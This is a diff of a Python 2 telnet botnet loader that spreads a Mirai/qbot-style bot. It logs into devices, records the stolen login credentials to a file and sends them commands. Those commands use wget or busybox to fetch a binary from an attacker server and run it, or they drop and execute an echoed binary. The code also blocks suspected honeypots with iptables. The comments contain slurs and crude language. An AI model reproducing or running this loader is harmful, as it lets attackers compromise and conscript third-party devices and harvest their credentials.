@@ -1,13 +1,13 @@
 #!/usr/bin/python2
 #Phaaaat hax telnet loader by Freak
 #this loader actively detects honeypots using incorrect user agents when requesting bins.
+#this tel
 #it will actively block any detected honeypot with iptables.
 #UPDATED FOR May 2022, FASTEST TELNET LOADER EVER!!!! FASTER THAN MIRAI SKIDS
 #SELFREP MODE (recommended) configure capsaicin for scanlisten port
-#ncat -kvlp scanlistenport | python loader.py 1 8081
+#ncat -kvlp scanlistenport | python loader.py - 200
 
 import sys, re, os, socket, time, select, random
-#from pwn import * # MAKE SURE U INSTALL THE PWN LIBRARY U DAMN SKID
 from threading import Thread
 from struct import pack,unpack
 from ctypes import *
@@ -15,9 +15,9 @@ global serverip
 global binprefix
 global binname
 global nameprefix
-serverip = "yourdumbassvps"
-nameprefix = "qbotfagz."
-binprefix = "/lelz/" + nameprefix
+serverip = "yourshittyvpsserver"
+nameprefix = "botnet."
+binprefix = "/f/" + nameprefix
 binname = binprefix.split("/")[-1]
 global fh
 fh = open("bots.txt","a+")
@@ -251,12 +251,6 @@ def infect(ip, port, username, password):
     global wget
     global logins
     global echoed
-    echoed = []
-    tftp = 0
-    wget = 0
-    echo = 0
-    logins = 0
-    ran = 0
     if ip in echoed:
         return
     infectedkey = "PERROR"
@@ -450,7 +444,7 @@ def infect(ip, port, username, password):
             logins += 1
             fh.write(ip + ":" + str(port) + " " + username + ":" + password + "\n")
             fh.flush()
-            rekdevice = "wget http://" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; busybox wget http://""" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; chmod 777 """ + binname  + arch + """; ./""" + binname  + arch + """; rm -f """ + binname  + arch
+            rekdevice = "cd /tmp or cd $(find / -writable | head -n 1);\r\nwget http://" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; busybox wget http://""" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; chmod 777 """ + binname  + arch + """; ./""" + binname  + arch + """; rm -f """ + binname  + arch
             rekdevice = rekdevice.replace("\r", "").split("\n")
             for rek in rekdevice:
                 tn.send(rek + "\r\n")
@@ -486,7 +480,8 @@ def infect(ip, port, username, password):
                 print "\033[32m[\033[31m+\033[32m] \033[33mECHO \033[31m---> \033[32m" + ip + " \033[31m---> \033[36m(" + str(count) + "/" + str(parts) + ") " + arch + "\033[37m"
                 tn.send("chmod 777 updDl;busybox chmod 777 updDl\r\n")
                 tn.send("./updDl\r\n")
-                time.sleep(3)
+                time.sleep(1.7)
+                tn.send("./enemy")
                 tn.send("rm -rf ./updDl\r\n")
                 time.sleep(0.1)
                 buf = recvTimeout(tn, 1024*1024)
